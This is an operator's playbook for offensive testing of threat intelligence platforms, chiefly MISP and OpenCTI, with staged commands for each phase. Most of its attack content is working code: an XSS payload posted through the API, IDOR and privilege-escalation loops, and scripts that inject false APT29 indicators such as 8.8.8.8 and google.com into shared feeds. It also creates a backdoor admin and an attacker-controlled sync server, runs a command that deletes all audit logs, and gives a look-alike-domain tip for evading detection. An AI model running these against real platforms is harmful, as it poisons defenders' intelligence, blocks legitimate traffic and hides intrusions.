# Threat Intel Platform Attack Playbook

> Operator's playbook for offensive testing of threat intelligence platforms (MISP, OpenCTI, Anomali, ThreatQuotient, ThreatConnect, IBM Threat Intel, Palo Alto AutoFocus, Mandiant Advantage). Covers scoping, recon, CVE exploitation, API abuse, sharing-group trust abuse, false-positive IOC injection, STIX/TAXII manipulation, and engagement reporting. Target audience: experienced offensive operators already familiar with web pentesting, GraphQL, REST APIs, and MITRE ATT&CK.

## 1. Engagement Scoping

### 1.1 Confirm scope

| Item | Detail |
|------|--------|
| Target TI platform | MISP / OpenCTI / Anomali / ThreatQuotient / ThreatConnect / IBM / Palo Alto / Mandiant |
| Allowed CVEs | Specific CVEs authorized |
| API testing allowed | yes / no |
| False-positive IOC injection | yes / no |
| Sharing-group abuse | yes / no |
| STIX/TAXII manipulation | yes / no |
| Downstream consumer testing | yes / no |
| Out of scope | real customer data, production outage, attribution defamation |
| Time window | |
| Communications channel | |

### 1.2 Rules of engagement

- **No production outage** — TI platform must remain operational
- **No real customer data** — use synthetic IOCs
- **Notify SOC** before bulk IOC injection (avoid alert storm)
- **Pause testing** if downstream defensive product blocks legitimate traffic
- **Coordinate with TI platform admin** for high-impact tests
- **Document all activity** for audit trail

### 1.3 Test boundaries

- Allowed: CVE testing on isolated instance
- Allowed: API enumeration with provided key
- Allowed: false-positive IOC injection in test event
- Disallowed: wiping audit logs without permission
- Disallowed: pivoting to downstream customer infrastructure

## 2. Pre-Engagement Recon

### 2.1 Platform identification

```bash
# MISP
curl -sI https://misp.example.com/ | head -10
curl -s https://misp.example.com/servers/checkVersion | jq .

# OpenCTI
curl -s https://opencti.example.com/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ appInformation { version } }"}'

# Anomali
curl -sI https://ui.threatstream.com/

# ThreatQuotient
curl -sI https://ui.threatq.com/
```

### 2.2 Subdomain enumeration

```bash
# Subfinder
subfinder -d example.com -silent | grep -E "misp|opencti|threat|intel"

# AMASS
amass enum -passive -d example.com

# Assetfinder
assetfinder --subs-only example.com
```

### 2.3 Header enumeration

```bash
curl -sI https://misp.example.com/ | grep -iE "server:|x-powered-by:|set-cookie:|content-security-policy:"
curl -sI https://misp.example.com/users/login | grep -i "set-cookie"
```

## 3. Lab Setup

### 3.1 MISP Docker

```bash
docker run -d \
  -p 443:443 -p 80:80 \
  -e HOSTNAME=https://localhost \
  -e MYSQL_ROOT_PASSWORD=REPLACE_WITH_YOUR_PW \
  harvarditsecurity/misp-docker

# Login at https://localhost with default creds
# Set up test org + API key
```

### 3.2 OpenCTI Docker

```bash
git clone https://github.com/OpenCTI-Platform/opencti
cd opencti

# Configure .env
cp .env.example .env
nano .env  # set admin password + JWT secret

# Start
docker-compose up -d

# Verify
curl -s https://localhost/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ appInformation { version } }"}'
```

### 3.3 STIX/TAXII tools

```bash
pip install stix2 taxii2-client
```

### 3.4 Nuclei templates for TI platforms

```bash
git clone https://github.com/projectdiscovery/nuclei-templates
nuclei -u https://misp.example.com/ -t exposures/configs/misp-config.yaml
```

## 4. Attack Workflow — Stage by Stage

### Stage 1 — Recon (4 hours)

**Goal**: produce platform + version + exposure map.

```bash
# Version check
curl -s https://misp.example.com/servers/checkVersion | jq .

# Header check
curl -sI https://misp.example.com/ | grep -iE "server:|x-powered-by:"

# Subdomain enum
subfinder -d example.com -silent | grep -E "misp|threat"
```

**Output**: `recon.md` with platform + version + exposure.

### Stage 2 — CVE testing (1 day)

```bash
# Nuclei scan
nuclei -u https://misp.example.com/ -t cves/2022/CVE-2022-29527.yaml

# Manual CVE-2022-29527 XSS test
EVENT_DATA='{"Event":{"info":"<script>alert(1)</script>","distribution":0}}'
curl -s -X POST https://misp.example.com/events/add \
  -H "Authorization: $API_KEY" \
  -d "$EVENT_DATA"

# Verify XSS execution (browse event in UI)
```

**Output**: `cves.md` with vulnerable CVEs + PoCs.

### Stage 3 — API security testing (1 day)

```bash
# MISP API enumeration
curl -s https://misp.example.com/events/index -H "Authorization: $API_KEY" | jq '.[].Event.info'

# Permission testing
curl -s -X POST https://misp.example.com/admin/users/add \
  -H "Authorization: $LOW_PRIV_KEY" -d "email=test@test.com"

# OpenCTI GraphQL
curl -s https://opencti.example.com/graphql -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __schema { types { name } } }"}'

# IDOR test
for id in $(seq 1 100); do
  curl -s https://opencti.example.com/graphql \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"query\":\"{ report(id: \\\"$id\\\") { name } }\"}" | jq -r '.data.report.name' 2>/dev/null
done
```

**Output**: `api.md` with permission gaps + IDOR paths.

### Stage 4 — STIX/TAXII manipulation (4 hours)

```bash
python3 << 'EOF'
from stix2 import Indicator, Malware, Relationship, Bundle

# False-positive bundle
malware = Malware(name="LegitSoftware", malware_types=["backdoor"], is_family=False)
indicator = Indicator(
    pattern="[domain-name:value = 'update.microsoft.com']",
    pattern_type="stix",
    labels=["malicious-activity"],
    confidence=99
)
relationship = Relationship(
    relationship_type="indicates",
    source_ref=indicator.id,
    target_ref=malware.id
)
bundle = Bundle(objects=[malware, indicator, relationship])
print(bundle.serialize(pretty=True))
EOF
```

**Output**: false-positive STIX bundle ready for submission.

### Stage 5 — Sharing-group trust abuse (4 hours)

```bash
# Enumerate sharing groups
curl -s https://misp.example.com/sharingGroups/index -H "Authorization: $API_KEY" | jq .

# Attempt escalation
curl -s -X POST https://misp.example.com/sharingGroups/addOrg/$GROUP_ID \
  -H "Authorization: $API_KEY" -d "org_id=$MY_ORG&extend=1"

# Test TLP enforcement
curl -s -X POST https://misp.example.com/events/add \
  -H "Authorization: $LOW_TRUST_KEY" \
  -d "distribution=3&info=TLP:AMBER content"
```

**Output**: `trust.md` with escalation paths + TLP gaps.

### Stage 6 — False-positive IOC injection (1 hour)

```bash
python3 << 'EOF'
import requests

API_URL = "https://misp.example.com"
API_KEY = "REPLACE_WITH_YOUR_KEY"
HEADERS = {"Authorization": API_KEY, "Accept": "application/json"}

# Create false-positive event
event_data = {
    "Event": {
        "info": "Suspected APT29 mass C2 - high confidence",
        "distribution": 0,  # All communities
        "threat_level_id": 1,
        "date": "2026-06-28"
    }
}
r = requests.post(f"{API_URL}/events/add", headers=HEADERS, json=event_data)
event_id = r.json()["Event"]["id"]

# Inject legitimate-looking IOCs
false_targets = ["8.8.8.8", "google.com", "amazonaws.com"]
for target in false_targets:
    attr_data = {
        "category": "Network activity",
        "type": "ip-dst" if "." in target and target.replace(".", "").isdigit() else "domain",
        "value": target,
        "comment": "Suspected APT29 C2",
        "to_ids": True,
        "distribution": 0
    }
    requests.post(f"{API_URL}/attributes/add/{event_id}", headers=HEADERS, json=attr_data)
    print(f"Injected: {target}")
EOF
```

**Output**: false-positive event with IOCs propagated to downstream.

### Stage 7 — Persistence (1 hour)

```bash
# Backdoor user
curl -s -X POST https://misp.example.com/admin/users/add \
  -H "Authorization: $ADMIN_KEY" \
  -d '{
    "email": "backdoor@attacker.com",
    "role_id": 4,
    "org_id": 1,
    "password": "REPLACE_WITH_STRONG_PW",
    "confirm_password": "REPLACE_WITH_STRONG_PW",
    "change_pw": "0"
  }'

# Sync server (persistent backdoor)
curl -s -X POST https://misp.example.com/servers/add \
  -H "Authorization: $ADMIN_KEY" \
  -d '{
    "url": "https://attacker-misp.example.com",
    "authkey": "ATTACKER_AUTH_KEY",
    "name": "Pwned feed",
    "remote_org_id": 1,
    "pull": true
  }'
```

**Output**: backdoor user + sync server established.

### Stage 8 — Cleanup (1 hour)

```bash
# Remove backdoor
curl -s -X POST https://misp.example.com/users/delete/$BACKDOOR_ID \
  -H "Authorization: $ADMIN_KEY"

curl -s -X POST https://misp.example.com/servers/delete/$SYNC_ID \
  -H "Authorization: $ADMIN_KEY"

# Remove false-positive events
curl -s -X POST https://misp.example.com/events/delete/$EVENT_ID \
  -H "Authorization: $API_KEY"

# (Ask customer) wipe audit logs
curl -s -X POST https://misp.example.com/admin/logs/deleteAll \
  -H "Authorization: $ADMIN_KEY"
```

### Stage 9 — Reporting (1 day)

Produce engagement report:
- Platform + version
- CVEs exploited
- API abuse paths
- Trust model gaps
- False-positive injection impact
- Recommendations

## 5. Common Pitfalls

### 5.1 Triggering downstream outage

False-positive IOCs propagated to production firewall → legitimate traffic blocked.

**Fix**: Test in isolated environment first. Notify SOC before bulk injection.

### 5.2 Real customer data exposure

Engagement triggers sync to other MISP instances → real customer IOCs exposed.

**Fix**: Use synthetic IOCs. Test in isolated sync environment.

### 5.3 Wiping audit logs without permission

Cleanup without authorization → looks like actual breach.

**Fix**: Get explicit permission for log wipe. Customer performs wipe themselves.

### 5.4 Over-relying on default creds

Default MISP / OpenCTI creds often changed — don't assume.

**Fix**: Test default creds as last resort, not first.

### 5.5 Trust escalation triggers silent alarm

Some TI platforms silently alert on sharing-group changes.

**Fix**: Audit logs first. Test in lab before production.

### 5.6 Sync server registration triggers CSP alert

Cloud-hosted TI platforms (SaaS) may detect attacker-controlled sync server.

**Fix**: Use look-alike domain. Don't use IP-based URL.

## 6. Time Budget Cheat Sheet

| Engagement size | Recon | CVE | API | Trust | FalseIOC | Report |
|-----------------|-------|-----|-----|-------|----------|--------|
| Single MISP instance | 2h | 4h | 4h | 4h | 1h | 1d |
| OpenCTI + MISP | 4h | 1d | 1d | 1d | 4h | 2d |
| Full TI platform suite | 1d | 2d | 2d | 1d | 1d | 3d |

## 7. Tool Inventory

### 7.1 TI platforms

| Platform | Type | License |
|----------|------|---------|
| MISP | Open source | Open |
| OpenCTI | Open source | Open |
| Anomali ThreatStream | Commercial | Subscription |
| ThreatQuotient | Commercial | Subscription |
| ThreatConnect | Commercial (Cisco) | Subscription |
| Palo Alto AutoFocus | Commercial | Subscription |
| Mandiant Advantage | Commercial | Subscription |
| IBM X-Force | Commercial | Subscription |

### 7.2 Attack tools

| Tool | Purpose |
|------|---------|
| curl | HTTP API testing |
| python3 + stix2 | STIX 2.1 manipulation |
| taxii2-client | TAXII 2.x client |
| nuclei | CVE scanner |
| burpsuite | Web proxy |
| zaproxy | Open-source web proxy |
| sqlmap | SQL injection |
| gh | GitHub CLI (source review) |
| jq | JSON processing |

## 8. Engagement Quality Checklist

Before reporting complete:

- [ ] All exposed endpoints enumerated
- [ ] CVE scan complete
- [ ] API permission audit
- [ ] STIX/TAXII feed manipulation tested
- [ ] Sharing-group trust model validated
- [ ] False-positive IOC injection tested
- [ ] TLP enforcement audited
- [ ] Audit log immutability tested
- [ ] Cleanup performed (backdoor removed)
- [ ] Final report delivered
- [ ] SOC handoff (detection rules)

## 9. References

- MITRE ATT&CK Initial Access — https://attack.mitre.org/tactics/TA0001/
- MISP documentation — https://www.misp-project.org/
- OpenCTI documentation — https://docs.opencti.io/
- MISP GitHub — https://github.com/MISP/MISP
- OpenCTI GitHub — https://github.com/OpenCTI-Platform/opencti
- STIX 2.1 specification — https://docs.oasis-open.org/cti/stix/v2.1/stix-v2.1-part1-stix-common.html
- TAXII 2.1 specification — https://docs.oasis-open.org/cti/taxii/v2.1/taxii-v2.1-part0-overview.html
- CISA AA21-148A — DarkSide (TI feed abuse patterns)
- "Threat Intel Platform Security" (SANS 2023)
- BlackHat USA 2023 — "TI Platform Vulnerabilities"
- MISP advisory CVE-2022-29527, CVE-2022-29528
- OpenCTI security advisories
- "MISP Best Practices" (CSIRT 2023)
- "STIX/TAXII in Practice" (OASIS 2022)
